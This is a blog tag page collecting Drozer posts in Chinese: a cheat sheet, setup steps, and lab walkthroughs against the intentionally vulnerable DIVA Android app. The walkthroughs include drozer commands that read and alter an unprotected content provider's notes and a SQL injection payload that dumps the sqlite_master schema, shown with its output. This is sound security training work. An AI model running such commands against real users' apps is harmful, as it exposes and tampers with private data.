<!doctype html><html lang=en-us dir=ltr><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#343a40"><meta name=color-scheme content="light dark"><meta property="og:url" content="https://bernie6401.github.io/tags/drozer/"><meta property="og:site_name" content="SBK Hugo Site"><meta property="og:title" content="Drozer"><meta property="og:locale" content="en_us"><meta property="og:type" content="website"><title>Drozer | SBK Hugo Site</title>
<link rel=icon href=/favicon.png><link rel=manifest href=/manifest.json><link rel=canonical href=https://bernie6401.github.io/tags/drozer/><link rel=stylesheet href=/book.min.6c8b9d2a1fc95075ed7da46ca81060b39add8fff6741ac51259f768929281e2c.css integrity="sha256-bIudKh/JUHXtfaRsqBBgs5rdj/9nQaxRJZ92iSkoHiw=" crossorigin=anonymous><script defer src=/fuse.min.js></script><script defer src=/en.search.min.acdc41c8d39e6c69d70d8a23779875e0a3733fefead3e428d5344966bb12f562.js integrity="sha256-rNxByNOebGnXDYojd5h14KNzP+/q0+Qo1TRJZrsS9WI=" crossorigin=anonymous></script><link rel=alternate type=application/rss+xml href=https://bernie6401.github.io/tags/drozer/index.xml title="SBK Hugo Site"></head><body dir=ltr><input type=checkbox class="hidden toggle" id=menu-control>
<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><span>SBK Hugo Site</span></a></h2><div class="book-search hidden"><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><script>document.querySelector(".book-search").classList.remove("hidden")</script></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu></label><h3>Drozer</h3><label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav><ul><li class=book-section-flat><strong>Categories</strong><ul></ul></li><li class=book-section-flat><strong>Tags</strong><ul><li class="flex justify-between"><a href=/tags/ad/>AD</a>
<span>25</span></li><li class="flex justify-between"><a href=/tags/adworld/>Adworld</a>
<span>6</span></li><li class="flex justify-between"><a href=/tags/aegis/>AEGIS</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/ai/>AI</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/ais3/>AIS3</a>
<span>4</span></li><li class="flex justify-between"><a href=/tags/android/>Android</a>
<span>11</span></li><li class="flex justify-between"><a href=/tags/balsnctf/>BalsnCTF</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/book/>Book</a>
<span>3</span></li><li class="flex justify-between"><a href=/tags/btlo/>BTLO</a>
<span>8</span></li><li class="flex justify-between"><a href=/tags/cggc/>CGGC</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/chatgpt/>ChatGPT</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/crewctf/>CrewCTF</a>
<span>6</span></li><li class="flex justify-between"><a href=/tags/crypto/>Crypto</a>
<span>36</span></li><li class="flex justify-between"><a href=/tags/cryptography/>Cryptography</a>
<span>7</span></li><li class="flex justify-between"><a href=/tags/csc/>CSC</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/ctf/>CTF</a>
<span>267</span></li><li class="flex justify-between"><a href=/tags/cyberdefender/>CyberDefender</a>
<span>23</span></li><li class="flex justify-between"><a href=/tags/data-structure/>Data Structure</a>
<span>6</span></li><li class="flex justify-between"><a href=/tags/deadfacectf/>DeadFaceCTF</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/digital-forensics/>Digital Forensics</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/drozer/>Drozer</a>
<span>10</span></li><li class="flex justify-between"><a href=/tags/easy/>Easy</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/eductf/>Eductf</a>
<span>85</span></li><li class="flex justify-between"><a href=/tags/endpoint-forensics/>Endpoint Forensics</a>
<span>16</span></li><li class="flex justify-between"><a href=/tags/english-writing/>English Writing</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/forensics/>Forensics</a>
<span>8</span></li><li class="flex justify-between"><a href=/tags/general-skill/>General Skill</a>
<span>4</span></li><li class="flex justify-between"><a href=/tags/hackthebox/>Hackthebox</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/incident-response/>Incident Response</a>
<span>5</span></li><li class="flex justify-between"><a href=/tags/information-security/>Information Security</a>
<span>25</span></li><li class="flex justify-between"><a href=/tags/interview/>Interview</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/latex/>LaTeX</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/leetcode/>LeetCode</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/machine-learning/>Machine Learning</a>
<span>5</span></li><li class="flex justify-between"><a href=/tags/malware-reverse-engineering-and-analysis/>Malware Reverse Engineering and Analysis</a>
<span>7</span></li><li class="flex justify-between"><a href=/tags/meeting-paper/>Meeting Paper</a>
<span>20</span></li><li class="flex justify-between"><a href=/tags/misc/>Misc</a>
<span>44</span></li><li class="flex justify-between"><a href=/tags/mobsf/>MobSF</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/network-forensics/>Network Forensics</a>
<span>4</span></li><li class="flex justify-between"><a href=/tags/nisra/>NISRA</a>
<span>8</span></li><li class="flex justify-between"><a href=/tags/ntu/>NTU</a>
<span>67</span></li><li class="flex justify-between"><a href=/tags/ntu_ct/>NTU_CT</a>
<span>6</span></li><li class="flex justify-between"><a href=/tags/ntu_ml/>NTU_ML</a>
<span>5</span></li><li class="flex justify-between"><a href=/tags/ntu_mr/>NTU_MR</a>
<span>7</span></li><li class="flex justify-between"><a href=/tags/ntu_os/>NTU_OS</a>
<span>4</span></li><li class="flex justify-between"><a href=/tags/ntu_padns/>NTU_PADNS</a>
<span>8</span></li><li class="flex justify-between"><a href=/tags/ntu_st/>NTU_ST</a>
<span>3</span></li><li class="flex justify-between"><a href=/tags/ntucns/>NTUCNS</a>
<span>11</span></li><li class="flex justify-between"><a href=/tags/ntust/>NTUST</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/ntustisc/>NTUSTISC</a>
<span>32</span></li><li class="flex justify-between"><a href=/tags/ntustws/>NTUSTWS</a>
<span>29</span></li><li class="flex justify-between"><a href=/tags/nycu/>NYCU</a>
<span>6</span></li><li class="flex justify-between"><a href=/tags/picoctf/>PicoCTF</a>
<span>112</span></li><li class="flex justify-between"><a href=/tags/portswigger-web-security-academy/>Portswigger Web Security Academy</a>
<span>29</span></li><li class="flex justify-between"><a href=/tags/problem-solution/>Problem Solution</a>
<span>28</span></li><li class="flex justify-between"><a href=/tags/pwn/>PWN</a>
<span>57</span></li><li class="flex justify-between"><a href=/tags/reverse/>Reverse</a>
<span>46</span></li><li class="flex justify-between"><a href=/tags/security-operation/>Security Operation</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/side-project/>Side Project</a>
<span>3</span></li><li class="flex justify-between"><a href=/tags/software-testing/>Software Testing</a>
<span>3</span></li><li class="flex justify-between"><a href=/tags/special-topic/>Special Topic</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/taiwanholyhigh/>TaiwanHolyHigh</a>
<span>9</span></li><li class="flex justify-between"><a href=/tags/tcivs/>TCIVS</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/threat-intel/>Threat Intel</a>
<span>3</span></li><li class="flex justify-between"><a href=/tags/tools/>Tools</a>
<span>19</span></li><li class="flex justify-between"><a href=/tags/tscctf/>TSCCTF</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/web/>Web</a>
<span>93</span></li><li class="flex justify-between"><a href=/tags/welcome/>Welcome</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/windows/>Windows</a>
<span>7</span></li><li class="flex justify-between"><a href=/tags/%E5%90%8D%E8%A9%9E%E8%A7%A3%E9%87%8B/>名詞解釋</a>
<span>10</span></li><li class="flex justify-between"><a href=/tags/%E8%AE%80%E6%9B%B8%E5%BF%83%E5%BE%97/>讀書心得</a>
<span>2</span></li></ul></li></ul></nav></aside></header><article class="markdown book-post"><h2><a href=/tools/others/android-related/drozer/drozer-cheat-sheet/>Drozer Cheat Sheet</a></h2><div class=text-small><a href=/tags/android/>Android</a>,
<a href=/tags/drozer/>Drozer</a></div><p><h1 id=drozer-cheat-sheet>Drozer Cheat Sheet
<a class=anchor href=#drozer-cheat-sheet>#</a></h1><h2 id=basic-console>Basic Console
<a class=anchor href=#basic-console>#</a></h2><p>基本上最常用的command就是</p><pre tabindex=0><code class=language-bash! data-lang=bash!>dz&gt; run &lt;drozer module&gt; &lt;optional object&gt; # 啟動內建的module做到依稀操作
dz&gt; help &lt;drozer module&gt; # 查看該module的說明以及參數設定
</code></pre><pre tabindex=0><code class=language-bash! data-lang=bash!>dz&gt; run app.package.list #列出所有已安裝的app package
dz&gt; run app.package.list -f &lt;key word&gt; #列出特定的app package 
dz&gt; run app.package.info -a &lt;app package name&gt; # 列出該app的基本訊息
dz&gt; run app.package.manifest &lt;app package name e.g. jakhar.aseem.diva&gt; # 查看AndroidManifest.xml的資訊
dz&gt; run app.package.attacksurface &lt;app package name e.g. com.mwr.example.sieve&gt; # 查看該app有什麼攻擊面
Attack Surface:
    3 activities exported # 也許可以啟動一個activity並且bypass某種應該阻止我啟動他的權限
    0 broadcast receivers exported
    2 content providers exported # 也許可以fetch private data或是利用某些漏洞 e.g. sqli or path traversal
    2 services exported
        is debuggable
</code></pre><p>接著根據得到的資訊看要用以下哪一種的攻擊模式</p><a href=/tools/others/android-related/drozer/drozer-cheat-sheet/>...</a></p></article><article class="markdown book-post"><h2><a href=/tools/others/android-related/installation/drozer_mobsf-installation/>Drozer/MobSF Installation</a></h2><div class=text-small><a href=/tags/android/>Android</a>,
<a href=/tags/drozer/>Drozer</a>,
<a href=/tags/mobsf/>MobSF</a></div><p><h1 id=drozermobsf-installation>Drozer/MobSF Installation
<a class=anchor href=#drozermobsf-installation>#</a></h1><h2 id=installation---drozer>Installation - Drozer
<a class=anchor href=#installation---drozer>#</a></h2><p>我是參考<sup id=fnref:1><a href=#fn:1 class=footnote-ref role=doc-noteref>1</a></sup>的說明，但其實參考官網的也可以，我是用docker裝</p><ol><li>Download drozer-agent & Install - <a href=https://github.com/WithSecureLabs/drozer-agent/releases>Download</a>
這是要安裝在手機測試端的類似一個server的概念，而我們的電腦端也要安裝類似的東西(有好幾種方式，我是用Docker)，讓電腦和手機可以互通<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ adb install drozer-agent.apk
</span></span></code></pre></div></li><li>Start a Session
打開agent app會發現右下角有一個Off，點擊後會變成On，代表這個agent已經準備好要和電腦這邊的server連接
![Screenshot_20240603-131808](<a href=https://hackmd.io/_uploads/SkPEfC9NC.png>https://hackmd.io/_uploads/SkPEfC9NC.png</a> =200x)</li><li>設定電腦的Port轉發到Android的某個Port
根據<sup id=fnref:2><a href=#fn:2 class=footnote-ref role=doc-noteref>2</a></sup>的說明，以及官網的要求，我們必須要把電腦31415這個port的封包轉發到手機端的31415這個port<blockquote><p>Android 的 adb forward 通訊埠轉發的功能，adb forward 的功能是轉發 PC 電腦上某個埠號 (port) 資料到 Android 裝置的某個埠號 (port)，例如：下列 adb forward 指令就是將 PC 端的 port 10000 收到的資料，轉發給到 Android Device 的 port 20000</p></blockquote><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ adb forward tcp:31415 tcp:31415
</span></span></code></pre></div></li><li>Install PC Drozer Client
看到以下畫面就代表成功了<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ docker run -it --add-host host.docker.internal:host-gateway withsecurelabs/drozer console connect --server host.docker.internal
</span></span><span style=display:flex><span>Selecting ff762fc058e91df3 <span style=color:#f92672>(</span>Google Pixel 6a 13<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            ..                    ..:.
</span></span><span style=display:flex><span>           ..o..                  .r..
</span></span><span style=display:flex><span>            ..a..  . ....... .  ..nd
</span></span><span style=display:flex><span>              ro..idsnemesisand..pr
</span></span><span style=display:flex><span>              .otectorandroidsneme.
</span></span><span style=display:flex><span>           .,sisandprotectorandroids+.
</span></span><span style=display:flex><span>         ..nemesisandprotectorandroidsn:.
</span></span><span style=display:flex><span>        .emesisandprotectorandroidsnemes..
</span></span><span style=display:flex><span>      ..isandp,..,rotecyayandro,..,idsnem.
</span></span><span style=display:flex><span>      .isisandp..rotectorandroid..snemisis.
</span></span><span style=display:flex><span>      ,andprotectorandroidsnemisisandprotec.
</span></span><span style=display:flex><span>     .torandroidsnemesisandprotectorandroid.
</span></span><span style=display:flex><span>     .snemisisandprotectorandroidsnemesisan:
</span></span><span style=display:flex><span>     .dprotectorandroidsnemesisandprotector.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>drozer Console <span style=color:#f92672>(</span>v3.0.2<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>dz&gt;
</span></span></code></pre></div></li></ol><h2 id=installation---mobsf>Installation - MobSF
<a class=anchor href=#installation---mobsf>#</a></h2><p>可以直接使用<a href=https://mobsf.live/>線上的工具</a>，也可以用docker架在自己的電腦</p><a href=/tools/others/android-related/installation/drozer_mobsf-installation/>...</a></p></article><article class="markdown book-post"><h2><a href=/tools/others/android-related/drozer/test-diva/test-diva---activity-exported/>Test DIVA - activity exported</a></h2><div class=text-small><a href=/tags/android/>Android</a>,
<a href=/tags/drozer/>Drozer</a></div><p><ul><li>DIVA - <a href=https://payatu.com/wp-content/uploads/2016/01/diva-beta.tar.gz>Download</a></li></ul><h1 id=test-diva---activity-exported>Test DIVA - activity exported
<a class=anchor href=#test-diva---activity-exported>#</a></h1><p>參考<sup id=fnref:1><a href=#fn:1 class=footnote-ref role=doc-noteref>1</a></sup><sup id=fnref:2><a href=#fn:2 class=footnote-ref role=doc-noteref>2</a></sup><sup id=fnref:3><a href=#fn:3 class=footnote-ref role=doc-noteref>3</a></sup><sup id=fnref:4><a href=#fn:4 class=footnote-ref role=doc-noteref>4</a></sup></p><ol><li><p>起手式 - 確認App資訊</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>dz&gt; run app.package.list -f diva
</span></span><span style=display:flex><span>Attempting to run shell module
</span></span><span style=display:flex><span>jakhar.aseem.diva <span style=color:#f92672>(</span>Diva<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>dz&gt; run app.package.info -a jakhar.aseem.diva
</span></span><span style=display:flex><span>Attempting to run shell module
</span></span><span style=display:flex><span>Package: jakhar.aseem.diva
</span></span><span style=display:flex><span>  Application Label: Diva
</span></span><span style=display:flex><span>  Process Name: jakhar.aseem.diva
</span></span><span style=display:flex><span>  Version: 1.0
</span></span><span style=display:flex><span>  Data Directory: /data/user/0/jakhar.aseem.diva
</span></span><span style=display:flex><span>  APK Path: /data/app/~~ieYmYeSxvDRbS7R8da3n_g<span style=color:#f92672>==</span>/jakhar.aseem.diva--xnWMS5i2UVEuuoE1JHskg<span style=color:#f92672>==</span>/base.apk
</span></span><span style=display:flex><span>  UID: <span style=color:#ae81ff>10282</span>
</span></span><span style=display:flex><span>  GID: <span style=color:#f92672>[</span>3003<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>  Shared Libraries: <span style=color:#f92672>[</span>/system/framework/android.test.base.jar, /system/framework/org.apache.http.legacy.jar<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>  Shared User ID: null
</span></span><span style=display:flex><span>  Uses Permissions:
</span></span><span style=display:flex><span>  - android.permission.WRITE_EXTERNAL_STORAGE
</span></span><span style=display:flex><span>  - android.permission.READ_EXTERNAL_STORAGE
</span></span><span style=display:flex><span>  - android.permission.INTERNET
</span></span><span style=display:flex><span>  - android.permission.POST_NOTIFICATIONS
</span></span><span style=display:flex><span>  - android.permission.ACCESS_MEDIA_LOCATION
</span></span><span style=display:flex><span>  - android.permission.READ_MEDIA_AUDIO
</span></span><span style=display:flex><span>  - android.permission.READ_MEDIA_VIDEO
</span></span><span style=display:flex><span>  - android.permission.READ_MEDIA_IMAGES
</span></span><span style=display:flex><span>  Defines Permissions:
</span></span><span style=display:flex><span>  - None
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>dz&gt; run app.package.attacksurface jakhar.aseem.diva
</span></span><span style=display:flex><span>Attempting to run shell module
</span></span><span style=display:flex><span>Attack Surface:
</span></span><span style=display:flex><span>  <span style=color:#ae81ff>3</span> activities exported
</span></span><span style=display:flex><span>  <span style=color:#ae81ff>0</span> broadcast receivers exported
</span></span><span style=display:flex><span>  <span style=color:#ae81ff>1</span> content providers exported
</span></span><span style=display:flex><span>  <span style=color:#ae81ff>0</span> services exported
</span></span><span style=display:flex><span>    is debuggable
</span></span></code></pre></div><p>package name: jakhar.aseem.diva
attack surface: activities exported/content providers exported/is debuggable</p><a href=/tools/others/android-related/drozer/test-diva/test-diva---activity-exported/>...</a></p></article><article class="markdown book-post"><h2><a href=/tools/others/android-related/drozer/test-diva/test-diva---content-provider-exported---db-based/>Test DIVA - content provider exported - DB Based</a></h2><div class=text-small><a href=/tags/android/>Android</a>,
<a href=/tags/drozer/>Drozer</a></div><p><h1 id=test-diva---content-provider-exported---db-based>Test DIVA - content provider exported - DB Based
<a class=anchor href=#test-diva---content-provider-exported---db-based>#</a></h1><p>這一題是第<code>11. Access Control Issues - Part 3</code>，用意是要我們不需要PIN code就可以access儲存起來的notes</p><ol><li>起手式<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>dz&gt; run app.provider.info -a jakhar.aseem.diva
</span></span><span style=display:flex><span>Attempting to run shell module
</span></span><span style=display:flex><span>Package: jakhar.aseem.diva
</span></span><span style=display:flex><span>  Authority: jakhar.aseem.diva.provider.notesprovider
</span></span><span style=display:flex><span>    Read Permission: null
</span></span><span style=display:flex><span>    Write Permission: null
</span></span><span style=display:flex><span>    Content Provider: jakhar.aseem.diva.NotesProvider
</span></span><span style=display:flex><span>    Multiprocess Allowed: False
</span></span><span style=display:flex><span>    Grant Uri Permissions: False
</span></span><span style=display:flex><span>    Uri Permission Patterns:
</span></span><span style=display:flex><span>    Path Permissions:
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>dz&gt; run scanner.provider.finduris -a jakhar.aseem.diva
</span></span><span style=display:flex><span>Attempting to run shell module
</span></span><span style=display:flex><span>Scanning jakhar.aseem.diva...
</span></span><span style=display:flex><span>No respone from content URI:      content://jakhar.aseem.diva.provider.notesprovider/
</span></span><span style=display:flex><span>Got a response from content Uri:  content://jakhar.aseem.diva.provider.notesprovider/notes
</span></span><span style=display:flex><span>No respone from content URI:      content://jakhar.aseem.diva.provider.notesprovider
</span></span><span style=display:flex><span>Got a response from content Uri:  content://jakhar.aseem.diva.provider.notesprovider/notes/
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>For sure accessible content URIs:
</span></span><span style=display:flex><span>  content://jakhar.aseem.diva.provider.notesprovider/notes
</span></span><span style=display:flex><span>  content://jakhar.aseem.diva.provider.notesprovider/notes/
</span></span></code></pre></div>從以上測試結果可以知道<code>jakhar.aseem.diva.NotesProvider</code>的狀況，以及對應的URI為何</li><li>逆向
從<code>NotesProvider</code>這個class可以知道他就是一個負責管理Notes資料庫的一個class，並且同時負責query/update/insert/delete這幾個function，那我們是不是也可以用和Sieve類似的方法對這個database發出request</li><li>query/insert/update/delete/sqli<ul><li>query
我們達到了一開始題目的要求，只需要直接query就好了<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>dz&gt; run app.provider.query content://jakhar.aseem.diva.provider.notesprovider/notes --vertical
</span></span><span style=display:flex><span>Attempting to run shell module
</span></span><span style=display:flex><span>  _id  <span style=color:#ae81ff>5</span>
</span></span><span style=display:flex><span>title  Exercise
</span></span><span style=display:flex><span> note  Alternate days running
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  _id  <span style=color:#ae81ff>4</span>
</span></span><span style=display:flex><span>title  Expense
</span></span><span style=display:flex><span> note  Spent too much on home theater
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  _id  <span style=color:#ae81ff>6</span>
</span></span><span style=display:flex><span>title  Weekend
</span></span><span style=display:flex><span> note  b333333333333r
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  _id  <span style=color:#ae81ff>3</span>
</span></span><span style=display:flex><span>title  holiday
</span></span><span style=display:flex><span> note  Either Goa or Amsterdam
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  _id  <span style=color:#ae81ff>2</span>
</span></span><span style=display:flex><span>title  home
</span></span><span style=display:flex><span> note  Buy toys <span style=color:#66d9ef>for</span> baby, Order dinner
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  _id  <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>title  office
</span></span><span style=display:flex><span> note  <span style=color:#ae81ff>10</span> Meetings. <span style=color:#ae81ff>5</span> Calls. Lunch with CEO
</span></span></code></pre></div></li><li>insert<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>dz&gt; run app.provider.insert content://jakhar.aseem.diva.provider.notesprovider/notes --integer _id <span style=color:#ae81ff>7</span> --string title pwn1 --string note pwnpwn1
</span></span><span style=display:flex><span>Attempting to run shell module
</span></span><span style=display:flex><span>Done.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>dz&gt; run app.provider.query content://jakhar.aseem.diva.provider.notesprovider/notes
</span></span><span style=display:flex><span>Attempting to run shell module
</span></span><span style=display:flex><span>| _id | title    | note                                 |
</span></span><span style=display:flex><span>| <span style=color:#ae81ff>5</span>   | Exercise | Alternate days running               |
</span></span><span style=display:flex><span>| <span style=color:#ae81ff>4</span>   | Expense  | Spent too much on home theater       |
</span></span><span style=display:flex><span>| <span style=color:#ae81ff>6</span>   | Weekend  | b333333333333r                       |
</span></span><span style=display:flex><span>| <span style=color:#ae81ff>3</span>   | holiday  | Either Goa or Amsterdam              |
</span></span><span style=display:flex><span>| <span style=color:#ae81ff>2</span>   | home     | Buy toys <span style=color:#66d9ef>for</span> baby, Order dinner      |
</span></span><span style=display:flex><span>| <span style=color:#ae81ff>1</span>   | office   | <span style=color:#ae81ff>10</span> Meetings. <span style=color:#ae81ff>5</span> Calls. Lunch with CEO |
</span></span><span style=display:flex><span>| <span style=color:#ae81ff>7</span>   | pwn1     | pwnpwn1                              |
</span></span></code></pre></div></li><li>update<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>dz&gt; run app.provider.update content://jakhar.aseem.diva.provider.notesprovider/notes  --selection <span style=color:#e6db74>&#34;_id=?&#34;</span> --selectio
</span></span><span style=display:flex><span>n-args <span style=color:#ae81ff>7</span> --string title pwn2 --string note pwnpwn2
</span></span><span style=display:flex><span>Attempting to run shell module
</span></span><span style=display:flex><span>Done.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>dz&gt; run app.provider.query content://jakhar.aseem.diva.provider.notesprovider/notes
</span></span><span style=display:flex><span>Attempting to run shell module
</span></span><span style=display:flex><span>| _id | title    | note                                 |
</span></span><span style=display:flex><span>| <span style=color:#ae81ff>5</span>   | Exercise | Alternate days running               |
</span></span><span style=display:flex><span>| <span style=color:#ae81ff>4</span>   | Expense  | Spent too much on home theater       |
</span></span><span style=display:flex><span>| <span style=color:#ae81ff>6</span>   | Weekend  | b333333333333r                       |
</span></span><span style=display:flex><span>| <span style=color:#ae81ff>3</span>   | holiday  | Either Goa or Amsterdam              |
</span></span><span style=display:flex><span>| <span style=color:#ae81ff>2</span>   | home     | Buy toys <span style=color:#66d9ef>for</span> baby, Order dinner      |
</span></span><span style=display:flex><span>| <span style=color:#ae81ff>1</span>   | office   | <span style=color:#ae81ff>10</span> Meetings. <span style=color:#ae81ff>5</span> Calls. Lunch with CEO |
</span></span><span style=display:flex><span>| <span style=color:#ae81ff>7</span>   | pwn2     | pwnpwn2                              |
</span></span></code></pre></div></li><li>delete<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>dz&gt; run app.provider.delete content://jakhar.aseem.diva.provider.notesprovider/notes --selection <span style=color:#e6db74>&#34;_id=?&#34;</span> --selection
</span></span><span style=display:flex><span>-args <span style=color:#ae81ff>7</span>
</span></span><span style=display:flex><span>Attempting to run shell module
</span></span><span style=display:flex><span>Done.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>dz&gt; run app.provider.query content://jakhar.aseem.diva.provider.notesprovider/notes
</span></span><span style=display:flex><span>Attempting to run shell module
</span></span><span style=display:flex><span>| _id | title    | note                                 |
</span></span><span style=display:flex><span>| <span style=color:#ae81ff>5</span>   | Exercise | Alternate days running               |
</span></span><span style=display:flex><span>| <span style=color:#ae81ff>4</span>   | Expense  | Spent too much on home theater       |
</span></span><span style=display:flex><span>| <span style=color:#ae81ff>6</span>   | Weekend  | b333333333333r                       |
</span></span><span style=display:flex><span>| <span style=color:#ae81ff>3</span>   | holiday  | Either Goa or Amsterdam              |
</span></span><span style=display:flex><span>| <span style=color:#ae81ff>2</span>   | home     | Buy toys <span style=color:#66d9ef>for</span> baby, Order dinner      |
</span></span><span style=display:flex><span>| <span style=color:#ae81ff>1</span>   | office   | <span style=color:#ae81ff>10</span> Meetings. <span style=color:#ae81ff>5</span> Calls. Lunch with CEO |
</span></span></code></pre></div></li><li>sqli
測試的payload如下，的確出現sqli的漏洞，而且可以看到完整的table<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>dz&gt; run app.provider.query content://jakhar.aseem.diva.provider.notesprovider/notes --selection <span style=color:#e6db74>&#34;&#39;&#34;</span>
</span></span><span style=display:flex><span>Attempting to run shell module
</span></span><span style=display:flex><span>Exception occured: unrecognized token: <span style=color:#e6db74>&#34;&#39;) ORDER BY title&#34;</span> <span style=color:#f92672>(</span>code <span style=color:#ae81ff>1</span> SQLITE_ERROR<span style=color:#f92672>)</span>: , <span style=color:#66d9ef>while</span> compiling: SELECT * FROM notes WHERE <span style=color:#f92672>(</span><span style=color:#e6db74>&#39;) ORDER BY title
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>dz&gt; run app.provider.query content://jakhar.aseem.diva.provider.notesprovider/notes --projection &#34;* FROM SQLITE_MASTER WHERE type=&#39;</span>table<span style=color:#960050;background-color:#1e0010>&#39;</span>;--<span style=color:#e6db74>&#34;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>Attempting to run shell module
</span></span></span><span style=display:flex><span><span style=color:#e6db74>| type  | name             | tbl_name         | rootpage | sql                                                                                                 |
</span></span></span><span style=display:flex><span><span style=color:#e6db74>| table | android_metadata | android_metadata | 3        | CREATE TABLE android_metadata (locale TEXT)                                                         |
</span></span></span><span style=display:flex><span><span style=color:#e6db74>| table | notes            | notes            | 4        | CREATE TABLE notes (_id INTEGER PRIMARY KEY AUTOINCREMENT, title TEXT NOT NULL, note TEXT NOT NULL) |
</span></span></span><span style=display:flex><span><span style=color:#e6db74>| table | sqlite_sequence  | sqlite_sequence  | 5        | CREATE TABLE sqlite_sequence(name,seq)                                                              |
</span></span></span></code></pre></div>也可以透過drozer自動找可能的點<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>dz&gt; run scanner.provider.injection -a jakhar.aseem.diva
</span></span><span style=display:flex><span>Attempting to run shell module
</span></span><span style=display:flex><span>Scanning jakhar.aseem.diva...
</span></span><span style=display:flex><span>Not Vulnerable:
</span></span><span style=display:flex><span>  content://jakhar.aseem.diva.provider.notesprovider/
</span></span><span style=display:flex><span>  content://jakhar.aseem.diva.provider.notesprovider
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Injection in Projection:
</span></span><span style=display:flex><span>  content://jakhar.aseem.diva.provider.notesprovider/notes/
</span></span><span style=display:flex><span>  content://jakhar.aseem.diva.provider.notesprovider/notes
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Injection in Selection:
</span></span><span style=display:flex><span>  content://jakhar.aseem.diva.provider.notesprovider/notes/
</span></span><span style=display:flex><span>  content://jakhar.aseem.diva.provider.notesprovider/notes
</span></span><span style=display:flex><span>
